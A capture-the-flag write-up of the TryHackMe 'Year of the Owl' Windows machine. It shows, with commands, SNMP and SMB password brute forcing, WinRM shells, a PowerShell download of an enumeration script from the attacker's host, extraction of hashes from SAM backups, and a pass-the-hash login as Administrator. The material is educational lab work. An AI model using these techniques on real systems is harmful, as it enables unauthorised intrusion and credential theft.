# Hacking Year of the Owl - THM

The Year of the Owl is a machine by MuirlandOracle on [tryhackme](https://tryhackme.com)

## Initial Port Scanning with nmap

We start by using nmap to scan the TCP ports.

```bash
ports145=$(sudo nmap -n -Pn -p- --min-rate=250 -sS --open 10.10.187.145 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
```

The results show us that this appears to be a windows machine because we see netbios on port 139, SMB on 445 and winrm on its default port of 5985. We take a closer look but don't find much of interest.

![nmap1](/images/1.png)

Since SMB is running, we can try a *null session* attack using `sudo smbmap -H 10.10.187.145` but this does not work. We cannot connect using *rpcclient* via `sudo rpcclient -U'%' 10.10.187.145'` without valid creds, either :frowining_face:

![nmap2](/images/2.png)

>[!NOTE]
>Web app enumeration does not yield anything of use so I have not included it in this writeup

### Scanning Common UDP Ports

We need to find another way to enumerate usernames and potential passwords. We can try common UDP ports using nmap.

```bash
sudo nmap -T4 -Pn -n -p53,69,111,123,137,161,500,514,520 --open -sUV -version-intensity 0 -oG udp.gnmap 10.10.187.145
```

![nmap3](/images/3.png)

The results come back in the `open|filtered` state which is not very useful.

We do not know if the ports are *open* or if the UDP datagrams are being *dropped* by some kind of filter.

## Enumeration of Simple Network Management Protocol

We can test *Simple Network Management Protocol* using a tool such as `onesixtyone`. If this service is running, we might be able to bruteforce its *community string* and then look for usernames via the *object identifier* `1.3.6.1.4.1.77.1.2.25`

In `SNMP` community strings act like passwords. If we find one, we can send read or read and write commands to the device we are interacting with - *public* community strings let us send *read* commands whilst *private* community strings let us send *read and write* commands.

Each managed device has a Management Information Base (MIB) which is essentially a database relating to its properties.

The MIB has a tree of objects which can be accessed via their unique Object IDentifier. This OID is the path along the tree to a specific object.

We can gather lots of data about the device using SNMP if we find a valid community string. In this case, we want to know more about the users of the device.

>[!TIP]
>Usernames are found at the OID of 1.3.6.1.4.1.77.1.2.25 - this is a useful OID to know :slightly_smiling_face: 

We try bruteforcing community strings using the `onesixtyone` tool and a good dictionary from [SecLists](https://github.com/danielmiessler/SecLists)

The attack works :smiley: and we are able to read the usernames of the managed device at the aforementioned OID - we see there is one non-default username - Jareth. 

![snmp1](/images/4.png)

## OSINT and Obtaining Initial Credentials

We could now try to bruteforce a password for `Jareth` using a wordlist such as `rockyou.txt` but it could take a long time and possibly not work.

At this point, the name Jareth combined with the image of the owl and the clue in the description of the box which mentions labyrinth starts to ring a :bell: somewhere - it is worth doing some research online :detective:

![osint1](/images/5.png)

We can now create a custom wordlist for this user based on Open Source INTelligence. It might not work but it is worth a try. If it does not work, we could use a tool such as the [Common User Password Profiler](https://github.com/Mebus/cupp) which will mangle the words we enter so we have a better chance of success.

![osint2](/images/6.png)

>[!NOTE]
>There are lots of tools we can use to bruteforce credentials - in this attack we are using [patator](https://github.com/lanjelot/patator)

```bash
sudo patator smb_login host=10.10.187.145 port=445 user=Jareth password=FILE0 0=./jareth_words.txt -x ignore:fgrep="STATUS_LOGON_FAILURE" --rate-limit 3
```

![patator1](/images/7.png)

We find the simple word list works. We can now try enumerating SMB again but this time with valid credentials. Unfortunately, we cannot get anything useful even with valid creds `sudo smbmap -H 10.10.187.145 -u Jareth -p <REDACTED>` and since we do not have write access to the admin shares a psexec attack is not possible.

![valid1](/images/8.png)

## Gaining Intital Foothold with winrm

Thinking again :thinking: we remember that SMB is not the only service running on this machine - `winrm` is running, too.

Windows Remote Management is used by admin to remotely manage hosts on networks - it is not enabled by default but it is commonly used. We need valid credentials to interact with the remote hosts. This is why it is important that we enumerate usernames. We can also just attack the default windows ones such as the administrator account.

In this case, we can use `crackmapexec` with its `winrm` mode to see if Jareth has used the same password for `winrm` and `SMB`

```bash
sudo crackmapexec winrm 10.10.187.145 -u 'Jareth' -p '<REDACTED>'
```

It turns out that he did :smiley:

![winrm1](/images/9.png)

We can now use these creds to get a shell via the `evil-winrm` tool. We can then grab the user flag and start our priv esc mission.

```bash
sudo evil-winrm -u 'Jareth' -p '<REDACTED>' -i 10.10.187.145
```

![winrm2](/images/10.png)

![winrm3](/images/11.png)

## Privilege Escalation

The priv esc on this machine is tricky as there appears to be antivirus software running.

### Automated Scripts

I tried *winpeas* and managed to get it onto the victim machine using an [alternate datastream](https://github.com/puzz00/host-and-network/blob/main/system-and-hosts/windows-file-system.md) in a txt file, but I could not then get it to execute!

I did manage to get the [JAWS](https://github.com/411Hall/JAWS) powershell enumeration script to work...

```powershell
Invoke-WebRequest 'http://10.8.46.6/jaws-enum.ps1' -OutFile 'jaws.ps1'
./jaws.ps1
```

![jaws1](/images/13.png)

![jaws2](/images/16.png)

![jaws3](/images/17.png)

...but it did not find anything of use...

![jaws4](/images/18.png)

...we need to manually enumerate this machine...

### Manual Methods

We manually enumerate just about everywhere and everything we can think of and find nothing of use - at this point we start to go ~~more~~ :zany_face: 

Evenutally, the thought comes to take a look in Jareths *recycle bin*.

![manual1](/images/19.png)

In order to do this, we need to get the Security IDentifier (SID) for Jareth.

```powershell
Get-LocalUser -Name $env:USERNAME | Select sid
```

Once we have done so, we take a look in his recycle bin and are (pleasantly) surprised to find what appears to be backup files of the SAM database and syskey which is used to encrypt it.

These are sensitive files and really shouldnt be hanging around anywhere attackers can access.

In windows, passwords for users are hashed and stored in the SAM database. This file is locked by the NT kernel whilst the OS is running to prevent access to it. This is why we usually try to dump the hashes from memory using a tool such as `mimikatz` or the `kiwi` extension if we have gained a `meterpreter` session. This is possible because the process which is responsible for managing authentication - LSAS - stores a copy of the hashes in RAM.

```powershell
gci -Force '$Recycle.Bin\S-1-5-21<SNIP>1001'
```

[manual2](/images/20.png)

There is a feeling of relief - the beginning of the end is in sight...

Since we have found what appears to be a backup copy of the SAM database along with the syskey, we can transfer them to the `C:\Temp` directory we created so we can then download them to our local attacking machine and attempt to get the hashes from them.

[manual3](/images/21.png)

[manual4](/images/22.png)

## Getting System

We can use `secretsdump.py` from [impacket](https://github.com/fortra/impacket/tree/master) to get the hashes from the looted sam and system backup files.

```bash
sudo python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.bak -system system.bak local
```

[system1](/images/23.png)

This is great because we now have the full NTLM hash for the Administrator user.

We can use this hash in *pass-the-hash* attacks or as in this case to get an elevated shell using *winrm*

>[!IMPORTANT]
>We need to always loot hashes whenever we can as they can enable us to gain persistence to the victim machine

We now get an elevated shell with `winrm` and the looted hash for the Administrator user and soon grab the root flag :partying_face:

>[!NOTE]
>The NTLM hash is used as the value for the `-p` parameter when using `evil-winrm`

```bash
sudo evil-winrm -u 'Administrator' -p '<REDACTED>' -i 10.10.23.43
```

![system2](/images/24.png)

![system3](/images/25.png)

## Conclusion

This is a fun box which reminds us of the importance of enumerating the common UDP ports as well as the TCP ones.

It also reminds us to thoroughly enumerate victim machines - the sensitive files in the recycle bin were unexpected but essential to pwn the box.

Thank you to [MuirlandOracle](https://tryhackme.com/p/MuirlandOracle) for creating the room, and thank you to *you* for reading my writeup of it :fist:
